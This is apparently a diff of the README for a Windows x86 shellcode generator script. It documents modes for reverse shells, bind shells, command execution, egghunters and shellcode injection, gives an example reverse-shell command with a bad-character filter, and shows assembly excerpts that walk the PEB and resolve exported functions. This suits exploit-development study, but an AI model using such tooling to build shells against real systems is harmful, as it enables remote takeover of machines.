@@ -4,26 +4,28 @@
 
 ```
 $ python3 win_x86_shellcoder.py -h
-usage: win_x86_shellcoder.py [-h] [-b BADCHARS] [-r] [-w] [-e {process,thread,none}] {reverse,bind,exec,egghunter} ...
+usage: win_x86_shellcoder.py [-h] [-b BADCHARS] [-r] [-w] [-e {process,thread,none}]
+                             {reverse,bind,exec,egghunter,loadfile} ...
 
 Windows x86 Shellcode Generator
 
 positional arguments:
-  {reverse,bind,exec,egghunter}
+  {reverse,bind,exec,egghunter,loadfile}
                         Shellcode mode
-    reverse             Reverse shell
-    bind                Bind shell
-    exec                Execute command
-    egghunter           Egghunter
+    reverse             Generate reverse shell shellcode
+    bind                Generate bind shell shellcode
+    exec                Generate execute command shellcode
+    egghunter           Generate egghunter shellcode
+    loadfile            Load shellcode from file
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   -b BADCHARS, --badchars BADCHARS
-                        Bad chars
-  -r, --run_shellcode   Run shellcode
-  -w, --use_windbg      Set int3 for windbg
+                        Characters to avoid
+  -r, --run_shellcode   Inject shellcode into a current Python process
+  -w, --use_windbg      Insert int3 for debugger into shellcode
   -e {process,thread,none}, --exit_func {process,thread,none}
-                        Exit Function
+                        Function called to terminate shellcode
 ```
 
 
@@ -40,11 +42,14 @@ $ python3 win_x86_shellcoder.py -b '\x00\x0a\x0d\x20\x30' reverse -i 192.168.1.1
 [x] 648b7130     : mov esi, dword ptr fs:[ecx + 0x30]
 [ ] 8b760c       : mov esi, dword ptr [esi + 0xc]
 [ ] 8b761c       : mov esi, dword ptr [esi + 0x1c]
-[ ] 8b5e08       : mov ebx, dword ptr [esi + 8]
-[x] 8b7e20       : mov edi, dword ptr [esi + 0x20]
-[ ] 0fb6461e     : movzx eax, byte ptr [esi + 0x1e]
-[ ] 8945f8       : mov dword ptr [ebp - 8], eax
-[ ] 56           : push esi
+...
+[ ] 8b433c       : mov eax, dword ptr [ebx + 0x3c]
+[ ] 8b7c0378     : mov edi, dword ptr [ebx + eax + 0x78]
+[ ] 01df         : add edi, ebx
+[ ] 8b4f18       : mov ecx, dword ptr [edi + 0x18]
+[x] 8b4720       : mov eax, dword ptr [edi + 0x20]
+[ ] 01d8         : add eax, ebx
+[ ] 8945fc       : mov dword ptr [ebp - 4], eax
 ...
 ```
 
@@ -59,15 +64,17 @@ find_and_call:
     dec   ecx                       // * FOR BAD CHAR 0x30 *
     mov   esi,[esi+0x0C]            // ESI = PEB->Ldr
     mov   esi,[esi+0x1C]            // ESI = PEB->Ldr.InInitOrder
-
-next_module:
-    mov   ebx, [esi+0x08]           // EBX = InInitOrder[X].base_address
-    inc   esi                       // * FOR BAD CHAR 0x20 *
-    mov   edi, [esi+0x1F]           // EDI = InInitOrder[X].module_name
-    dec   esi                       // * FOR BAD CHAR 0x20 *
-    movzx eax, byte ptr [esi+0x1e]  // EAX = InInitOrder[X].module_name_length
-    mov   [ebp-0x8], eax            // Save ModuleNameLength for later
-    push  esi                       // Save InInitOrder for next module
+...
+find_function:
+    mov   eax, [ebx+0x3C]           // Offset to PE Signature
+    mov   edi, [ebx+eax+0x78]       // Export Table Directory RVA
+    add   edi, ebx                  // Export Table Directory VMA
+    mov   ecx, [edi+0x18]           // NumberOfNames
+    inc   edi                       // * FOR BAD CHAR 0x20 *
+    mov   eax, [edi+0x1F]           // AddressOfNames RVA
+    dec   edi                       // * FOR BAD CHAR 0x20 *
+    add   eax, ebx                  // AddressOfNames VMA
+    mov   [ebp-0x4], eax            // Save AddressOfNames VMA for later
 ```
 
 
